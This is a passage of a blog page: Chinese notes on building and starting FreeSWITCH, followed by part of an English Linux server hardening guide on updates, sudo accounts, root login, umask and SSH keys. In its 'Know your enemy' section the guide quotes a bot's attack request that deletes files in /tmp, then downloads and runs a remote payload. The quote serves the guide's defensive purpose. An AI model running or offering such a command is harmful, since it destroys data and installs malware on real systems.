</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">export</span> PKG_CONFIG_PATH=/usr/local/lib/pkgconfig:<span style="color:#0ff;font-weight:bold">${</span>PKG_CONFIG_PATH<span style="color:#0ff;font-weight:bold">}</span> 
</span></span><span style="display:flex;"><span>ldconfig
</span></span></code></pre></td></tr></table>
</div>
</div><p>修改module.conf。</p>
<p>由于freeswitch支持动态编译和动态加载，一些不需要的模块可以不编译，如：mod_signalwire、mod_av，修改方法：</p>
<p>找到<code>modules.conf</code>文件，该文件的位置：<code>/data/freeswitch/modules.conf</code>，可以使用命令查找<code>find / -name modules.conf</code></p>
<p>找到mod_signalwire和mod_av注释掉，修改如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>#applications/mod_signalwire
</span></span><span style="display:flex;"><span>#applications/mod_av
</span></span></code></pre></td></tr></table>
</div>
</div><p>有了前两步的准备，编译freeswitch基本就不会遇到问题了，命令如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">cd</span> /data/freeswitch
</span></span><span style="display:flex;"><span>./bootstrap.sh
</span></span><span style="display:flex;"><span>./configure --enable-portable-binary --prefix=/usr/local/freeswitch --with-gnu-ld --with-python --with-openssl --enable-core-odbc-support --enable-zrtp
</span></span><span style="display:flex;"><span>make
</span></span><span style="display:flex;"><span>make install
</span></span></code></pre></td></tr></table>
</div>
</div><p>编译如果出现问题，一般是多编译了不需要的模块，所以根据提示依次在<code>modules.conf</code>注释掉这些模块后，再次编译即可。</p>
<p>freeswitch安装完成之后，下一步就是启动freeswitch并验证可用性了。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>===============启动命令================
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#详细启动日志并进入控制台模式命令</span>
</span></span><span style="display:flex;"><span>freeswitch -c -nonat -rp
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#退出详细模式启动命令</span>
</span></span><span style="display:flex;"><span>shutdown
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#后台启动freeswitch服务（推荐使用）</span>
</span></span><span style="display:flex;"><span>freeswitch -nc -nonat
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#进入控制台模式命令</span>
</span></span><span style="display:flex;"><span>fs_cli
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#退出控制台命令</span>
</span></span><span style="display:flex;"><span>/exit 
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#关闭freeswitch命令</span>
</span></span><span style="display:flex;"><span>freeswitch -stop
</span></span><span style="display:flex;"><span>===============查询服务命令=============
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#查看freeswitch安装路径</span>
</span></span><span style="display:flex;"><span>whereis freeswitch
</span></span><span style="display:flex;"><span>查看进程号
</span></span><span style="display:flex;"><span>ps -ef | grep freeswithch
</span></span><span style="display:flex;"><span>查看freeswitch端口是否被监听
</span></span><span style="display:flex;"><span>netstat -anp | grep <span style="color:#ff0;font-weight:bold">5060</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#查看freeswitch的运行状态</span>
</span></span><span style="display:flex;"><span>status（控制台模式执行）
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#查看freewitch内置用户是否注册</span>
</span></span><span style="display:flex;"><span>sofia status profile internal reg（控制台模式执行）
</span></span></code></pre></td></tr></table>
</div>
</div><p>验证必要端口是否启动，检查5060、5066、8021等端口是否启动(还有其他端口，但现在只需要看这几个端口就可以证明freeswitch启动正常了)。</p>
<p><code>netstat -anp |grep freeswitch</code></p>
<h1 id="linux服务器加固指南">linux服务器加固指南<a hidden class="anchor" aria-hidden="true" href="#linux服务器加固指南">#</a></h1>
<p><a href="https://pboyd.io/posts/securing-a-linux-vm/">The Reluctant Sysadmin&rsquo;s Guide to Securing a Linux Server (pboyd.io)</a></p>
<h2 id="know-your-enemy">Know your enemy<a hidden class="anchor" aria-hidden="true" href="#know-your-enemy">#</a></h2>
<p>Before we get into it, we need to know what we’re up against, and first up are bots. As an experiment, I started a VM in AWS and enabled SSH passwords, and started an HTTP server. After only an hour, I had one failed SSH login and a dozen requests for things like:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.231/jaws;sh+/tmp/jaws
</span></span></code></pre></td></tr></table>
</div>
</div><p>I don’t know what <code>jaws</code> does, but it doesn’t sound friendly. (Hopefully, it’s obvious, but don’t run that–if you really must, I reversed the last octet of the IP address.)</p>
<p>These bots scan the Internet looking for any vulnerable systems. The good news is that they’re not out to get you so much as they’re out to get anyone. These attacks are usually easy to stop, keep your host updated, and be a little bit tougher than the next host on their list.</p>
<p>But sometimes, there is someone out to get you personally, and sadly no system is truly safe. The best we can do is block what’s known, put up defenses at every layer, and hope we’ve become more trouble than we’re worth. On that cheery note, let’s dive in.</p>
<h2 id="update-the-software">Update the software<a hidden class="anchor" aria-hidden="true" href="#update-the-software">#</a></h2>
<p>Even if you just launched it, your system is probably already outdated. There might even be a critical security vulnerability that didn’t make it into the VM image. So to start:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt update
</span></span><span style="display:flex;"><span>sudo apt upgrade
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="create-a-user-account">Create a user account<a hidden class="anchor" aria-hidden="true" href="#create-a-user-account">#</a></h2>
<p>You should not log in directly as <code>root</code>. Use another account and <code>sudo</code> when you need superuser access. Your cloud VM likely has another account already, which you can use, if you wish. But I prefer to make a new account because the default one tends to be obvious.</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo useradd -m -s /bin/bash <span style="color:#0ff;font-weight:bold">\
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold"></span>  -G users,sudo <span style="color:#0ff;font-weight:bold">\
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold"></span>  alfred
</span></span></code></pre></td></tr></table>
</div>
</div><p>Name your account whatever you like, but avoid anything easily guessable, like <code>admin</code>.</p>
<p>The <code>-G</code> line lists groups that the user belongs to. The <code>sudo</code> group will grant access to run commands as <code>root</code> (assuming <code>sudo</code> is configured this way, which it usually is).</p>
<p>You’ll need a password for this account. You won’t log in with this password, but you will need it for <code>sudo</code>, so pick a good one. Ideally, generate a random one in your password manager. To set the password:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo passwd alfred
</span></span></code></pre></td></tr></table>
</div>
</div><p>If your VM image disables password logins with SSH, copy the key from the default account to your new account:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cp -r ~{admin,alfred}/.ssh
</span></span><span style="display:flex;"><span>chown -R alfred:alfred ~alfred/.ssh/
</span></span></code></pre></td></tr></table>
</div>
</div><p>Log out and back in as your new user and verify that sudo works:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo bash -c <span style="color:#0ff;font-weight:bold">&#39;echo &#34;I am $USER!&#34;&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It should ask for your password. If it works without a password, then run <code>sudo visudo</code> and replace the line that begins with <code>%sudo</code> with:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>%sudo   ALL=(ALL:ALL) ALL
</span></span></code></pre></td></tr></table>
</div>
</div><p>Make sure <code>sudo</code> works before moving on because you can lock yourself out of <code>root</code> if you’re not careful.</p>
<p>We don’t want to leave old unused accounts around. So if there’s a default account from your VM image, delete it:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo userdel admin
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="disable-root-logins">Disable root logins<a hidden class="anchor" aria-hidden="true" href="#disable-root-logins">#</a></h2>
<p>Now that we have an account with <code>sudo</code> privileges, there’s no reason anyone should log in with <code>root</code>. First, disable root at the console:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo passwd -l root
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now prevent <code>root</code> from logging in over SSH. Add (or uncomment) this line in <code>/etc/ssh/sshd_config</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>PermitRootLogin no
</span></span></code></pre></td></tr></table>
</div>
</div><p>You will have to restart <code>sshd</code> for the change to take effect, but we’ll have a few more SSH config changes. If you’re anxious to do it now, run:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl restart ssh
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="umask"><code>umask</code><a hidden class="anchor" aria-hidden="true" href="#umask">#</a></h2>
<p>We need to change the default <code>umask</code>, which controls the permissions on new files and directories. Most Linux distributions default <code>umask</code> to <code>022</code>, which gives read access to every user. Run <code>umask</code> to see your current setting.</p>
<p>We want a <code>umask</code> of <code>077</code>, which removes access to every user except the one who created the file. <code>027</code> would work, too (full access for the owner, read for group, and nothing for other). The point is that it’s safer to loosen file permissions when needed rather than tighten them.</p>
<p>For <code>sh</code> and <code>bash</code>, we can add <code>umask</code> to <code>/etc/profile</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo bash -c <span style="color:#0ff;font-weight:bold">&#39;echo -e &#34;\numask 077&#34; &gt;&gt; /etc/profile&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you use another shell, I will assume you know where to configure it.</p>
<p>Log out and back in, then verify new files have the desired permissions:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ touch xyz ; ls -l xyz ; rm xyz
</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ff0;font-weight:bold">1</span> alfred alfred <span style="color:#ff0;font-weight:bold">0</span> Mar <span style="color:#ff0;font-weight:bold">25</span> 11:23 xyz
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ssh-keys">SSH keys<a hidden class="anchor" aria-hidden="true" href="#ssh-keys">#</a></h2>
<p>I know you, and I always use new, randomly generated passwords for every account, but most people don’t. Someday you may grant access to someone with bad password hygiene, so it’s best to start right and only allow logins by SSH key. Your cloud provider probably already configured an SSH key for you, but don’t skip this section because the default settings still need to be tweaked.</p>
<p>If you have an SSH key already that you want to use, then great. If not, and you’re on Linux or Mac, generate one:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -t rsa -b <span style="color:#ff0;font-weight:bold">4096</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you’re on Windows, <a href="https://www.puttygen.com/">PuTTYgen</a> should work (but don’t ask me about it because I’ve never used it).</p>
<p>Back on the server now. By default, SSH reads authorized keys from <code>$HOME/.ssh/authorized_keys</code>. The problem is that if an attacker finds an exploit that lets them write one file, you can be sure they’ll attempt to add a public key to <code>$HOME/.ssh/authorized_keys</code>. It’s safer if only <code>root</code> can add an SSH key.</p>
<p>We need a central place to keep public keys:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo mkdir -p /etc/ssh/authorized_keys
</span></span><span style="display:flex;"><span>sudo chmod 0711 /etc/ssh/authorized_keys
</span></span></code></pre></td></tr></table>
</div>
</div><p>The permissions on the directory give <code>root</code> full access. Everyone else can read files but not create them or even get a directory listing.</p>
<p>We’ll create one file in this directory for each user with SSH access. If you already have an <code>authorized_keys</code> file, you can copy it into place:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo cp ~alfred/.ssh/authorized_keys /etc/ssh/authorized_keys/alfred
</span></span></code></pre></td></tr></table>
</div>
</div><p>If not, paste the public key:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo bash -c &#39;echo your public ssh key &gt; /etc/ssh/authorized_keys/alfred&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>The last step is to make the file readable by the user:</p>
